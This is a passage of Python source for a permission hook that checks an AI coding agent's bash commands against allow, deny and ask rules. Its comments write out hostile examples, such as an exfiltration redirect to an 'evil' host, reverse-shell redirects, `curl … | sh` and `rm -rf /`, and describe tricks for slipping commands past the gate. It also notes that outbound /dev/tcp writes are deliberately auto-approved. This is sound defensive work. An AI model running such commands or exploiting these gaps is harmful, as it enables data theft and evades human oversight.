#!/usr/bin/env python3
"""
PreToolUse Hook: Compound Bash Command Validator

Validates compound bash commands (with |, &&, ||, ;) by:
1. Splitting into sub-commands
2. Checking each against allowed/denied patterns
3. Allowing if ALL sub-commands are allowed

Features:
- Auto-approves known-safe command combinations
- Logs commands requiring manual confirmation to ~/.claude/bash_manual_confirm.log
- Supports replay mode for testing edge cases from logged commands

Replay Mode Usage:
    cat ~/.claude/bash_manual_confirm.log | head -n 5 | pretool_hook.py --dry-run
    CLAUDE_HOOK_REPLAY=1 cat commands.log | pretool_hook.py
"""

import io
import json
import re
import shlex
import sys
import os
from datetime import datetime, timezone
from typing import Dict, List, Any

# Import our modules
try:
    from bash_command_parser import BashCommandParser
    from settings_loader import SettingsLoader
except ImportError:
    # If running from different directory, try adding hooks dir to path
    import pathlib
    hooks_dir = pathlib.Path(__file__).parent.absolute()
    sys.path.insert(0, str(hooks_dir))
    from bash_command_parser import BashCommandParser
    from settings_loader import SettingsLoader


# Debug logging
DEBUG = os.environ.get('CLAUDE_HOOK_DEBUG', '0') == '1'
DEBUG_LOG = os.path.expanduser('~/.claude/bash_hook_debug.log')

# Manual confirmation log - stores commands that were not auto-approved
MANUAL_CONFIRM_LOG = os.path.expanduser('~/.claude/bash_manual_confirm.log')
TMP_ALLOWED_ROOT = '/tmp'

# Output redirections to these pseudo-devices are always safe: they discard or
# echo output and create no file on disk, so they need no root containment
# check (and would fail one — none live under the workspace or /tmp). `/dev/fd/N`
# (handled separately) targets an already-open descriptor, not a new file.
SAFE_REDIRECT_DEVICES = {'/dev/null', '/dev/stdout', '/dev/stderr', '/dev/tty'}

# Bash network pseudo-paths: a redirect to `/dev/tcp/host/port` (or udp) opens a
# socket rather than creating a file, so the file-containment check never applies
# and would always reject it. These are allowed by explicit operator opt-in to
# keep port-probe diagnostics (`exec 3<>/dev/tcp/localhost/5432`) frictionless.
# NOTE: this also auto-approves outbound writes to ARBITRARY hosts — including
# exfiltration (`secret > /dev/tcp/evil/443`) and reverse-shell redirects. That
# trade-off was made deliberately; narrow these prefixes to `.../localhost/` and
# `.../127.0.0.1/` if local-only probing is all that's wanted.
NET_REDIRECT_PREFIXES = ('/dev/tcp/', '/dev/udp/')

# Tokens that merely INTRODUCE or WRAP another command and must therefore be
# transparent to permission checking: the command that follows is the thing that
# actually runs and must be the thing we validate. Whitelisting any of these as
# Bash(<word>:*) would auto-authorize whatever comes after them (e.g. the parser
# splits `for i in ...; do curl ...; done` into a sub-command `do curl ...`, and
# `Bash(do:*)` would then green-light an arbitrary `curl`). Instead we peel these
# prefixes off and validate the effective command underneath.

# Shell control keywords that are directly followed by a command. NOT included:
# `for`/`case`/`select`/`in` (followed by a word/list, not a command) and the
# terminators `done`/`fi`/`esac` (nothing dangerous follows them).
CONTROL_KEYWORD_PREFIXES = {
    'if', 'elif', 'while', 'until', 'then', 'else', 'do', '!',
}

# Wrapper binaries that exec another command, possibly after their own flags and
# a fixed number of leading positional args. The value is how many non-flag
# positional args to skip after the wrapper's flags (e.g. `timeout <duration>`,
# `flock <lockfile>`). `sudo` is deliberately EXCLUDED — privilege escalation
# should always prompt, never auto-allow.
#
# `command` is handled separately (see _reduce_to_effective_command): it has a
# dual nature — `command NAME ...` execs NAME (a wrapper, like the entries here),
# but `command -v/-V NAME` is a lookup that runs nothing, so it must not be peeled
# down to NAME and validated as an execution.
WRAPPER_PREFIXES = {
    'exec': 0, 'time': 0, 'env': 0, 'xargs': 0, 'nohup': 0, 'setsid': 0,
    'builtin': 0, 'stdbuf': 0, 'nice': 0, 'ionice': 0,
    'chrt': 0, 'watch': 0,
    'timeout': 1,  # leading <duration>
    'flock': 1,    # leading <lockfile|fd>
}

# Per-wrapper short/long flags that consume a SEPARATE following argument whose
# value is DATA (a var name, directory, signal, duration) — never a command.
# When peeling a wrapper's own flags we must drop that operand too, otherwise it
# is mistaken for the command name: `env -u DATABASE_URL pnpm ...` would
# otherwise reduce to `DATABASE_URL pnpm ...` and be validated as a command
# named `DATABASE_URL`, which matches nothing and forces a needless prompt. Only
# the SEPARATED form (`-u NAME`) needs this entry — the glued forms (`-uNAME`,
# `--unset=NAME`) are already self-contained single tokens stripped by the plain
# flag skip. `env -i`/`timeout --foreground` and friends take no argument and so
# are deliberately absent.
#
# DELIBERATELY EXCLUDED: `env -S`/`--split-string`, whose operand is itself a
# command string to run. Dropping it as opaque data would hide that command from
# validation — `env -S "reboot"` would reduce to nothing and auto-allow. Left
# out of this map, `-S` is treated as a plain flag and the operand stays as the
# command head, so it is validated (and prompts) instead of being bypassed.
WRAPPER_ARG_FLAGS = {
    'env': {'-u', '--unset', '-C', '--chdir'},
    'timeout': {'-s', '--signal', '-k', '--kill-after'},
    'xargs': {'-I', '-P', '--max-procs', '-n', '--max-args', '-L', '--max-lines',
              '-s', '--max-chars', '-E', '-d', '--delimiter'},
}

# A pattern the wrapper's leading POSITIONAL operand must match before we skip it
# (see WRAPPER_PREFIXES counts). Without this, the skip is blind: `timeout
# reboot` treats `reboot` as the duration, peels it, and reduces to nothing —
# auto-allowing `reboot`. A real `timeout` duration is unambiguous: an
# optionally-fractional number with an optional unit suffix (`5`, `5s`, `0.5m`,
# `10h`, `2d`). When the operand does NOT match, it is the command itself, so we
# stop peeling and validate it (`timeout rm -rf /` keeps `rm` as the head).
# `flock` has no entry: its positional is a lockfile/fd that is not reliably
# distinguishable from a command name, and its residual mis-peel is not
# exploitable (a bare `flock reboot` has no command operand, so nothing runs).
WRAPPER_POSITIONAL_PATTERNS = {
    'timeout': re.compile(r'^[0-9]+(\.[0-9]+)?[smhd]?$'),
}

# Flags that switch the `command` builtin from exec mode to lookup mode. With any
# of these present, `command` behaves like `which`/`type` — it prints where NAME
# would resolve and runs nothing — so the operand must NOT be validated as if it
# were executed. Bash spells these `-v` and `-V` (combinable with `-p`, e.g. -pv).
COMMAND_LOOKUP_FLAGS = {'v', 'V'}

# Shell keywords whose ENTIRE sub-command is loop/conditional scaffolding that
# runs nothing on its own. These differ from CONTROL_KEYWORD_PREFIXES: those
# INTRODUCE a command and are peeled so the command after them is validated
# (`if grep ...` -> validate `grep ...`). These, by contrast, are followed by a
# word-list rather than a command (`for i in 4 5`, `select opt in a b`) or are
# bare block terminators (`done`, `fi`, `esac`) — so the whole sub-command is
# reduced to '' (auto-allow). This is safe because any command substitution in a
# loop's word-list (e.g. `for f in $(ls)`) is extracted as its own sub-command by
# the parser and validated independently; dropping the scaffolding cannot
# authorize it. `for`/`select`/`case` are deliberately NOT in
# CONTROL_KEYWORD_PREFIXES for exactly this reason (peeling `for` would leave
# `i in 4 5`, which would then fail validation as a command named `i`).
SCAFFOLDING_KEYWORDS = {
    'for', 'select',       # word-list loop headers (the list is data, not a command)
    'done', 'fi', 'esac',  # block terminators
}

# Shell builtins whose sub-command runs nothing dangerous regardless of its
# arguments, so the whole sub-command reduces to a no-op (auto-allow). These show
# up constantly in generated diagnostic scripts:
#   `: > "$LOG"`             truncate a file via the null command
#   `... || { ...; exit 1; }`   bail out of a chain on failure
#   `local mode="$1"`        declare a function-local variable
#   `set -euo pipefail`      set shell options
# The unifying safety property: NONE of these can run an arbitrary command. They
# only inspect or mutate the current shell's own state — variables, attributes,
# options, the directory stack, positional params, the job table — or terminate
# it. So peeling them to '' cannot authorize anything: any redirection target is
# stripped by the parser, and any command substitution in their args (e.g.
# `local x=$(cmd)`, `set -- $(cmd)`) is extracted and validated as its own
# sub-command. Whatever follows the builtin is data (a name, assignment, option,
# numeric status, job spec, or path), never a command to validate.
#
# NOT in this set (deliberately): `eval` (executes arbitrary strings), `exec`
# (handled as a wrapper above; replaces the process image), `trap` and `source`
# (handled via SAFE_BUILTINS below — they are allowed but not "runs nothing"):
# `alias` (can shadow a real command), `mapfile`/`readarray` (their `-C` callback
# runs per line), and `kill` (signals arbitrary processes).
NOOP_BUILTINS = {
    ':', 'true', 'false',  # pure no-ops
    'exit', 'return',      # terminate shell/function (numeric status only)
    'disown',              # detach a job from the job table (job specs only)
    'unset',               # remove a variable/function (names or -v/-f only)
    # Declaration builtins — bind variables / set attributes, never exec.
    'local', 'declare', 'typeset', 'readonly', 'export',
    # Loop-control builtins — only affect iteration of the current shell loop.
    'break', 'continue',
    # Shell-state / positional-parameter builtins — mutate the current shell only.
    'set', 'shopt', 'shift', 'let', 'read', 'getopts', 'umask', 'ulimit', 'wait',
    'hash', 'times',
    # Directory-stack builtins — change cwd / the dir stack (path operands only).
    'cd', 'pushd', 'popd', 'dirs',
}

# Curated set of shell builtins that are safe to auto-allow by head-token match,
# without requiring a pattern entry in settings.json. A sub-command whose HEAD
# TOKEN (the bare command word after stripping leading KEY=VALUE env prefixes) is
# in this set skips the ALLOW pattern lookup.
#
# ALLOW-TIER ONLY (task 28 §2.1). The shortcut runs *below* the deny and ask
# lookups: an operator's `permissions.deny` / `permissions.ask` entry for one of
# these builtins is matched first and wins, so the shortcut can never downgrade a
# deny to a prompt or an ask to an auto-allow (epic 22 invariant 1, brd D1/D2).
# The original landing (6283e6b) returned before any pattern lookup, which made
# all 19 tokens un-retractable by the operator; that was the bug this ordering
# fixes. Do not move the shortcut back above _tier_override_result.
#
# Selection criteria: the builtin must NOT be able to execute an arbitrary
# command string or replace the current process image. All entries only inspect
# or mutate the current shell's own state (variables, resource limits, signal
# dispositions, positional parameters, shell options) or perform a fixed
# structural operation with no code-execution side effects.
#
# DELIBERATELY EXCLUDED — and must remain excluded — even if they appear
# superficially safe:
#   eval  — executes an arbitrary string as shell code; the canonical "exec
#            anything" builtin. Adding it would make SAFE_BUILTINS a bypass for
#            the entire permission system.
#   exec  — replaces the process image; handled as a wrapper in WRAPPER_PREFIXES
#            so the command it runs is validated on its own merits. Listing exec
#            here would auto-allow arbitrary process replacement without checking
#            the target command.
# Do not add either without a full security review and explicit operator sign-off.
#
# NOTE on SETTINGS.JSON REDUNDANCY: several of these builtins already appear as
# individual Bash(<name>:*) pattern entries in .claude/settings.json (e.g.
# Bash(set:*), Bash(export:*), Bash(source:*), Bash(read:*), Bash(for:*),
# Bash(done:*), Bash(fi:*), Bash(break:*), Bash(wait:*)). Those entries are now
# redundant with SAFE_BUILTINS and can be pruned from settings.json in a future
# cleanup pass. They are intentionally left in place for the transition period
# (removing them would change live gate behaviour for a second reason in the same
# change, and .claude/settings.json is merged into ~/.claude/settings.json by the
# installer, so a repo deletion does not cleanly retract them).
SAFE_BUILTINS = {
    # Already in NOOP_BUILTINS / SCAFFOLDING_KEYWORDS — listed here for the
    # complete canonical reference; the NOOP path fires first for these.
    'set', 'export', 'read', 'for', 'done', 'fi', 'break',
    'shift', 'local', 'wait', 'umask', 'ulimit', 'getopts',
    'return', 'continue', 'unset', 'readonly',
    # Not in NOOP_BUILTINS — SAFE_BUILTINS is the only auto-allow path for these.
    # BOTH carry an extra guard beyond the head-token match (task 28 §2.2/§2.3);
    # neither is auto-allowed on its head token alone:
    #   source — executes a file. The shortcut applies ONLY when the operand is a
    #            LITERAL path (`source ./lib.sh`): a file already on disk, no
    #            code-generation surface. When the operand carries a shell
    #            expansion (`source "$X"`, `source $(mktemp)`, `source `mktemp``)
    #            the target is chosen at runtime, so the shortcut is refused and
    #            the sub-command falls through to the normal pattern path.
    #            See _source_operand_is_literal.
    #   trap   — registers a handler string for later delivery; the handler runs
    #            when the signal/event fires, not at trap-call time, in THIS
    #            shell. The handler is therefore extracted and validated as its
    #            own sub-command (the way a $(…) substitution already is) and the
    #            verdict for the whole `trap ...` sub-command is the handler's
    #            verdict: `trap 'curl … | sh' EXIT` inherits whatever
    #            `curl … | sh` decides. A handler that cannot be parsed with
    #            confidence asks, never allows, and so does any handler whose
    #            RAW text carries a `$` or a backtick — what `trap` registers is
    #            a template and this validator has no model of the environment it
    #            expands in. Only the forms that register no handler at all
    #            (`trap`, `trap -p/-l …`, `trap - SIG`, `trap '' SIG`,
    #            `trap SIG`) take the bare shortcut.
    #            See _trap_handler_verdict.
    'source', 'trap',
}

# A leading function-definition header: `name() {`, `name ()`, `function name {`,
# or `function name() {`. Defining a function runs nothing, and its body is
# validated as separate sub-commands, so dropping the header can never authorize
# the body. At the head of a sub-command, `name()` is unambiguously a function
# definition in valid bash (a simple command cannot be named `name()`, subshells
# start with `(` not `name(`, and `$(...)`/`((...))` are tokenized separately),
# so this match has no realistic false positives. The match is a PREFIX, not the
# whole string: the inline form `name() { echo hi` is parsed by the tokenizer as
# one sub-command (the opening brace is not a split point), so we strip the
# `name() {` prefix and validate the `echo hi` body that follows it. The captured
# `name` is recorded so later invocations of the function resolve to a no-op too.
_FUNCTION_DEF_RE = re.compile(
    r'^\s*(?:function\s+(?P<fname>[A-Za-z_][A-Za-z0-9_]*)(?:\s*\(\))?'  # function name [()]
    r'|(?P<pname>[A-Za-z_][A-Za-z0-9_]*)\s*\(\))'                       # name()
    r'\s*\{?\s*'
)

# A `$VAR` or `${VAR}` parameter reference. Used to substitute constant-like
# variable assignments collected from the same compound command (see
# BashPermissionValidator._expand_constants).
_VAR_REF_RE = re.compile(
    r'\$\{(?P<braced>[A-Za-z_][A-Za-z0-9_]*)\}'  # ${VAR}
    r'|\$(?P<plain>[A-Za-z_][A-Za-z0-9_]*)'      # $VAR
)


def _strip_function_def_header(cmd: str):
    """
    If cmd begins with a function-definition header, return (name, remainder);
    otherwise return (None, cmd).

    The remainder is the inline body command that followed the opening brace, or
    '' when the header stands alone:
        'parse() {'           -> ('parse', '')
        'greet() { echo hi'   -> ('greet', 'echo hi')
        'function foo {'      -> ('foo', '')
        'git status'          -> (None, 'git status')
    """
    m = _FUNCTION_DEF_RE.match(cmd)
    if not m:
        return None, cmd
    name = m.group('fname') or m.group('pname')
    return name, cmd[m.end():].strip()


def _head_token(cmd: str) -> str:
    """
    The bare command word of an ALREADY-REDUCED sub-command ('' when empty).

    Both auto-allow paths that key on SAFE_BUILTINS take their head token from
    here, and both feed it the output of _reduce_to_effective_command — leading
    `KEY=VALUE` env prefixes and wrapper/keyword introducers are peeled by then,
    so this is a plain first-word split.

    (Its predecessor, _effective_head_token, peeled `KEY=VALUE` off the
    UN-reduced sub-command: the one prefix the parser had already stripped, and
    none of the thirteen — `if`, `while`, `env`, `timeout 5`, ... — that do reach
    it. That mismatch was review finding MEDIUM 1; see task 28 §5.)
    """
    parts = cmd.split()
    return parts[0] if parts else ''


def _collapse_whitespace(text: str) -> str:
    """
    Whitespace-collapse a string the way the parser normalizes a sub-command
    (BashCommandParser._strip_grouping_tokens re-joins `text.split()` with single
    spaces). Kept here so the trap path can recognise a token the parser flattened
    and recover its original text.
    """
    return ' '.join(text.split())


def _dedupe(items: List[str]) -> List[str]:
    """Drop duplicates while preserving first-seen order."""
    seen = set()
    out = []
    for item in items:
        if item not in seen:
            seen.add(item)
            out.append(item)
    return out


def _format_command_list(commands: List[str], limit: int = 6) -> str:
    """
    Render a list of sub-commands for the permission prompt: each quoted, comma-
    separated, with an overflow tail so a long compound command does not produce
    an unbounded reason string.
    """
    shown = [f"`{c}`" for c in commands[:limit]]
    if len(commands) > limit:
        shown.append(f"(+{len(commands) - limit} more)")
    return ", ".join(shown)


def debug_log(message: str):
    """Log debug message if debug mode is enabled"""
    if DEBUG:
        try:
            with open(DEBUG_LOG, 'a') as f:
                timestamp = datetime.now(timezone.utc).isoformat()
                f.write(f"[{timestamp}] {message}\n")
        except Exception as e:
            print(f"Debug log error: {e}", file=sys.stderr)


def resolve_workspace_dir(input_data: Dict[str, Any]) -> str:
    """
    Resolve the workspace directory for this hook invocation.

    Claude provides the active working directory in the hook payload. That is
    more reliable than the process cwd, which can point at the hooks directory
    or another launcher-specific location.
    """
    candidates = [
        os.environ.get('CLAUDE_WORKSPACE_DIR', ''),
        input_data.get('cwd', ''),
        os.getcwd(),
    ]
    for candidate in candidates:
        if candidate:
            return os.path.abspath(candidate)
    return os.path.abspath(os.getcwd())


def log_manual_confirmation(command: str, result: Dict[str, Any], workspace_dir: str, session_id: str = None):
    """
    Log a command that required manual confirmation (was not auto-approved)

    Args:
        command: The raw bash command string
        result: The validation result dictionary
        workspace_dir: The workspace directory where command was run
        session_id: Optional session ID for correlation
    """
    try:
        log_entry = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'session_id': session_id or os.environ.get('CLAUDE_SESSION_ID', ''),
            'workspace': workspace_dir,
            'command': command,
            'decision': result['decision'],
            'reason': result['reason'],
            'sub_commands': result.get('sub_commands', []),
            'validation_results': result.get('validation_results', [])
        }
        with open(MANUAL_CONFIRM_LOG, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        debug_log(f"Failed to write manual confirm log: {e}")


def replay_from_log(stdin_lines=None):
    """
    Debug mode: Read and replay commands from stdin (one JSON entry per line)

    This allows testing edge cases by piping the log file:
        cat commands.log | grep -v grep | head -n 5 | pretool_hook.py

    Expected input format: one JSON object per line with at least a 'command' field

    Args:
        stdin_lines: Optional list of strings to process (for internal use when
                     stdin has already been read for peek detection)
    """
    import argparse

    parser = argparse.ArgumentParser(description='Replay commands from log for testing')
    parser.add_argument('--dry-run', '-n', action='store_true',
                        help='Show validation results without processing')
    args = parser.parse_args()

    workspace_dir = os.environ.get('CLAUDE_WORKSPACE_DIR', os.getcwd())
    settings_loader = SettingsLoader(workspace_dir)
    cmd_parser = BashCommandParser()
    validator = BashPermissionValidator(settings_loader, cmd_parser, workspace_dir)

    print(f"=== Replay Mode ===", file=sys.stderr)
    print(f"Workspace: {workspace_dir}", file=sys.stderr)
    print(f"Allowed patterns: {len(validator.allowed_patterns)}", file=sys.stderr)
    print(f"Denied patterns: {len(validator.denied_patterns)}", file=sys.stderr)
    print(f"==================\n", file=sys.stderr)

    # Use provided lines or read from stdin
    lines = stdin_lines if stdin_lines is not None else sys.stdin.readlines()

    debug_log(f"Replay: processing {len(lines)} lines")

    for line in lines:
        line = line.strip()
        if not line:
            continue

        try:
            entry = json.loads(line)
            command = entry.get('command', '')

            if not command:
                print(f"Skipping entry without command: {entry}", file=sys.stderr)
                continue

            print(f"\n--- Command: {command!r} ---", file=sys.stderr)
            result = validator.validate_bash_command(command)

            print(f"Decision: {result['decision']}", file=sys.stderr)
            print(f"Reason: {result['reason']}", file=sys.stderr)
            print(f"Sub-commands: {result['sub_commands']}", file=sys.stderr)

            if args.dry_run:
                continue

            # Simulate the hook decision
            if result['decision'] == 'allow':
                output = {
                    'hookSpecificOutput': {
                        'hookEventName': 'PreToolUse',
                        'permissionDecision': 'allow'
                    }
                }
                print(json.dumps(output))
            elif result['decision'] == 'deny':
                output = {
                    'hookSpecificOutput': {
                        'hookEventName': 'PreToolUse',
                        'permissionDecision': 'deny',
                        'permissionDecisionReason': result['reason']
                    }
                }
                print(json.dumps(output))
            elif result['decision'] == 'ask':
                output = {
                    'hookSpecificOutput': {
                        'hookEventName': 'PreToolUse',
                        'permissionDecision': 'ask',
                        'permissionDecisionReason': result['reason']
                    }
                }
                print(json.dumps(output))

        except json.JSONDecodeError as e:
            print(f"Invalid JSON line: {line[:100]}... Error: {e}", file=sys.stderr)
            continue
        except Exception as e:
            print(f"Error processing command: {e}", file=sys.stderr)
            import traceback
            traceback.print_exc(file=sys.stderr)
            continue

    sys.exit(0)


class BashPermissionValidator:
    """Validate bash commands against Claude settings"""

    def __init__(self, settings_loader: SettingsLoader, command_parser: BashCommandParser, workspace_dir: str = None):
        """
        Initialize validator

        Args:
            settings_loader: Settings loader instance
            command_parser: Command parser instance
            workspace_dir: The workspace directory for checking local binaries
        """
        self.parser = command_parser
        self.settings = settings_loader.load_all_settings()
        self.allowed_patterns = self.settings.get('permissions', {}).get('allow', [])
        self.denied_patterns = self.settings.get('permissions', {}).get('deny', [])
        self.ask_patterns = self.settings.get('permissions', {}).get('ask', [])
        self.workspace_dir = os.path.abspath(workspace_dir or os.getcwd())

        debug_log(f"Loaded {len(self.allowed_patterns)} allow patterns, {len(self.denied_patterns)} deny patterns, {len(self.ask_patterns)} ask patterns")
        debug_log(f"Workspace dir: {self.workspace_dir}")

    def validate_bash_command(self, command: str) -> Dict[str, Any]:
        """
        Validate compound command

        Args:
            command: Full bash command to validate

        Returns:
            Dictionary with:
            - decision: 'allow' | 'deny' | 'defer'
            - reason: Explanation string
            - sub_commands: List of parsed sub-commands
            - validation_results: List of validation results for each sub-command
        """
        debug_log(f"Validating command: {command!r}")

        # Parse compound command, keeping each sub-command's source offset.
        parsed = self.parser.parse_with_offsets(command)
        sub_commands = [cmd for cmd, _off in parsed]
        debug_log(f"Parsed into {len(sub_commands)} sub-commands: {sub_commands}")

        # Map each function defined in this compound command to the EARLIEST
        # source offset at which it is defined. A call to such a function runs
        # only the function body (validated separately as its own sub-commands),
        # so the call itself is a no-op — but ONLY once the definition has been
        # reached. bash defines functions in source order and executes top to
        # bottom, so a call may treat the name as the function only if the
        # definition lexically precedes it (def_offset < call_offset). Without
        # this ordering check, `rm -rf /; rm() { :; }` would auto-allow the real
        # `rm` that runs before the no-op function is ever defined.
        function_defs = {}
        for cmd, off in parsed:
            name, _ = _strip_function_def_header(cmd)
            if name is not None:
                if name not in function_defs or off < function_defs[name]:
                    function_defs[name] = off
        if function_defs:
            debug_log(f"Locally-defined functions (name->offset): {function_defs}")

        # Resolve constant-like variable assignments so a later `$VAR` use is
        # validated against the command it actually runs. A common pattern is to
        # bind a tool path once (`GODOT=/usr/local/bin/godot`) and invoke it as
        # `$GODOT ...` throughout the script; without resolution `$GODOT
        # --headless` matches no allow pattern and forces an `ask`. We only
        # collect STANDALONE assignments (a whole-statement `KEY=VALUE`, which
        # persists for the rest of the script — not a `KEY=VALUE cmd` prefix)
        # whose value is a literal constant, and we only substitute into uses
        # that the assignment lexically precedes. Substitution can therefore
        # only REVEAL the real command for the normal allow/deny check, never
        # hide one: `X=rm; $X -rf /` expands to `rm -rf /`, still denied.
        const_assignments = {}  # name -> [(offset, literal_or_None), ...]
        for name, raw_value, off in self.parser.extract_assignments(command):
            literal = BashCommandParser.is_constant_value(raw_value)
            const_assignments.setdefault(name, []).append((off, literal))
        for name in const_assignments:
            const_assignments[name].sort(key=lambda pair: pair[0])
        if const_assignments:
            debug_log(f"Constant assignments (name->[(off,val)]): {const_assignments}")

        # Validate each sub-command
        results = []
        for cmd, off in parsed:
            expanded = self._expand_constants(cmd, const_assignments, off)
            if expanded != cmd:
                debug_log(f"  Expanded constants: {cmd!r} -> {expanded!r}")
            result = self._check_single_command(expanded, function_defs, off,
                                                raw_command=command,
                                                unexpanded_cmd=cmd)
            results.append(result)
            debug_log(f"  Sub-command {cmd!r}: allowed={result['allowed']}, denied={result['denied']}")

        # Independently of the per-command allow/deny check, gate where output
        # redirections WRITE. The parser strips redirect targets before command
        # matching, so an allowed command can still carry `> /etc/passwd`; this
        # surfaces every write target and flags any that escapes the workspace,
        # /tmp, or the write-safe /dev sinks. Recurses into command
        # substitutions, so a redirect hidden in `$(... > /etc/x)` is caught too.
        #
        # First resolve constant-like `$VAR` references the same way command
        # matching does, so the common `SP=/tmp/x; cmd > "$SP/out"` pattern is
        # vouched for by its literal value instead of prompting on an
        # unexpandable `$SP/out`. Expansion only ever REVEALS a literal the user
        # already wrote, and the containment check still applies to the result,
        # so a constant pointing outside the allowed roots (`OUT=/etc`) stays
        # refused — and is now shown resolved in the prompt.
        disallowed_targets = []
        for target, off in self.parser.extract_write_redirect_targets(command):
            expanded = self._expand_constants(target, const_assignments, off)
            if not self._is_redirect_target_allowed(expanded):
                disallowed_targets.append(expanded)
        disallowed_targets = _dedupe(disallowed_targets)

        # Make decision
        any_denied = any(r['denied'] for r in results)
        any_asked = any(r.get('asked') for r in results)
        all_allowed = all(r['allowed'] for r in results)

        if any_denied:
            # ANY denied → hard deny (D1: deny means deny, aligned with native semantics)
            denied_cmds = _dedupe([r['command'] for r in results if r['denied']])
            decision = 'deny'
            reason = "Matches a denied pattern: " + _format_command_list(denied_cmds)
        elif any_asked:
            # Ask outranks allow: a fully-allowlisted command with an ask-matched
            # sub-command still prompts (D2: honor permissions.ask).
            asked_cmds = _dedupe([r['command'] for r in results if r.get('asked')])
            decision = 'ask'
            reason = "Matches an ask pattern: " + _format_command_list(asked_cmds)
        elif disallowed_targets:
            # A redirection writes outside the workspace, /tmp, or /dev/null.
            decision = 'ask'
            reason = ("Redirects output outside the workspace, /tmp, or /dev/null — "
                      "review the write target: " + _format_command_list(disallowed_targets))
        elif all_allowed and len(sub_commands) > 0:
            # ALL allowed → explicitly allow
            decision = 'allow'
            reason = "All sub-commands are allowed"
        else:
            # Some unknown or empty → ask. Name the exact sub-commands that are
            # not on the allowlist so the user knows what to scrutinize, rather
            # than re-scanning the whole compound command themselves.
            unknown = _dedupe(
                [r['command'] for r in results if not r['allowed'] and not r['denied']]
            )
            decision = 'ask'
            if unknown:
                reason = ("Not in allowlist — review before approving: "
                          + _format_command_list(unknown))
            else:
                reason = "Contains unknown or empty commands"

        debug_log(f"Decision: {decision} - {reason}")

        return {
            'decision': decision,
            'reason': reason,
            'sub_commands': sub_commands,
            'validation_results': results
        }

    def _is_workspace_binary(self, cmd: str) -> bool:
        """
        Check if command is a binary/script located inside the workspace or /tmp.

        Supports:
        - Relative paths: ./script.sh, ./bin/app, ../dir/tool, tools/run.sh
        - Absolute paths: /workspace/bin/app (if inside workspace)
        - /tmp paths: /tmp/foo.sh

        Any command token containing a '/' is run by bash as a path relative to
        the cwd (PATH is not consulted), so a bare `tools/run.sh` executes the
        same file as `./tools/run.sh`. Both are accepted here; the realpath
        containment check below is what actually gates execution to inside the
        workspace (or /tmp), so a relative path that escapes (e.g. `../../etc/x`)
        is still rejected.
        """
        # Extract the first word (the binary/command)
        first_word = cmd.split()[0] if cmd.split() else cmd

        # Check for path-like commands
        is_path_like = (
            # Any non-absolute token containing a '/' is a cwd-relative path
            # execution (covers ./x, ../x, and bare tools/x.sh alike).
            ('/' in first_word and not first_word.startswith('/')) or
            (first_word.startswith('/') and (
                self.workspace_dir in first_word or
                first_word.startswith(TMP_ALLOWED_ROOT + os.sep) or
                first_word == TMP_ALLOWED_ROOT
            ))
        )

        if not is_path_like:
            return False

        try:
            # Resolve the path
            if first_word.startswith('/'):
                resolved = os.path.abspath(first_word)
            else:
                resolved = os.path.abspath(os.path.join(self.workspace_dir, first_word))

            # Check if resolved path is inside an allowed root (using real paths to handle symlinks).
            # Only resolve the directory with realpath — don't dereference the binary itself,
            # since venv python is a symlink to the system interpreter outside the workspace.
            real_cmd_dir = os.path.realpath(os.path.dirname(resolved))
            allowed_roots = [
                os.path.realpath(self.workspace_dir),
                os.path.realpath(TMP_ALLOWED_ROOT),
            ]

            for root in allowed_roots:
                if real_cmd_dir == root or real_cmd_dir.startswith(root + os.sep):
                    debug_log(f"Binary check: {first_word!r} -> dir={real_cmd_dir} inside {root}")
                    return True
            debug_log(f"Binary check: {first_word!r} -> dir={real_cmd_dir} not in allowed roots {allowed_roots}")
            return False
        except Exception as e:
            debug_log(f"Error checking workspace binary: {e}")
            return False

    def _resolve_target_path(self, path: str):
        """
        Resolve a command-line path operand to an absolute realpath the way bash
        would, or return None when it cannot be resolved with confidence.

        The containment checks below decide whether a path is "inside" an allowed
        root by string-prefix on its realpath. That reasoning is only sound if we
        first apply the same expansions the shell does before the path is handed to
        the binary. Skipping them lets an escaping target masquerade as a local
        one: `~/x` naively joins onto the workspace as a literal `~` subdirectory
        (`<ws>/~/x`), which is "inside" the workspace by string prefix even though
        bash deletes `$HOME/x`, well outside it. So we:

          1. expanduser  — `~`/`~user` -> home dir (matches bash tilde expansion)
          2. expandvars  — `$VAR`/`${VAR}` -> value from the environment

        After expansion, if the path STILL contains a shell construct that could
        relocate the target — an unresolved `$` (undefined variable), a backtick
        or `$(...)` command substitution, or a leading `~` that did not expand
        (e.g. `~unknownuser`) — we cannot know where it actually points, so we
        return None and let the caller fall back to a prompt rather than vouch for
        it. Globs (`*`, `?`, `[`) are deliberately NOT treated as unresolvable:
        they do not change the path's rooting, so realpath containment stays
        correct (`~/*.txt` -> `/home/user/*.txt`, rejected; `*.txt` -> inside).
        """
        expanded = os.path.expandvars(os.path.expanduser(path))
        # Any of these mean the post-expansion target location is unknown.
        if '$' in expanded or '`' in expanded or expanded.startswith('~'):
            debug_log(f"target {path!r} has unresolved shell expansion "
                      f"({expanded!r}) - cannot confirm location")
            return None
        if expanded.startswith('/'):
            return os.path.realpath(expanded)
        return os.path.realpath(os.path.join(self.workspace_dir, expanded))

    def _is_path_inside_workspace(self, path: str) -> bool:
        """
        Check if a path (relative or absolute) is inside the workspace.

        Args:
            path: A file path (can be relative like 'file.txt' or absolute like '/workspace/file.txt')

        Returns:
            True if path resolves inside workspace
        """
        try:
            resolved = self._resolve_target_path(path)
            if resolved is None:
                return False

            real_workspace = os.path.realpath(self.workspace_dir)
            return resolved.startswith(real_workspace + os.sep) or resolved == real_workspace
        except Exception:
            return False

    def _allowed_roots(self) -> List[str]:
        """Realpaths of the roots writes/deletes may touch: workspace and /tmp."""
        return [
            os.path.realpath(self.workspace_dir),
            os.path.realpath(TMP_ALLOWED_ROOT),
        ]

    def _realpath_inside_allowed_roots(self, resolved: str) -> bool:
        """True if an already-resolved realpath sits in the workspace or /tmp."""
        for root in self._allowed_roots():
            if resolved == root or resolved.startswith(root + os.sep):
                return True
        return False

    def _is_path_inside_allowed_rm_roots(self, path: str) -> bool:
        """
        Check if a path is allowed for rm operations.

        We allow deletions inside the active workspace and inside /tmp.
        """
        try:
            resolved = self._resolve_target_path(path)
            if resolved is None:
                return False
            return self._realpath_inside_allowed_roots(resolved)
        except Exception:
            return False

    def _is_redirect_target_allowed(self, target: str) -> bool:
        """
        Decide whether an output redirection may write to `target` without a
        prompt. Allowed: the write-safe /dev sinks (and any `/dev/fd/N`), the
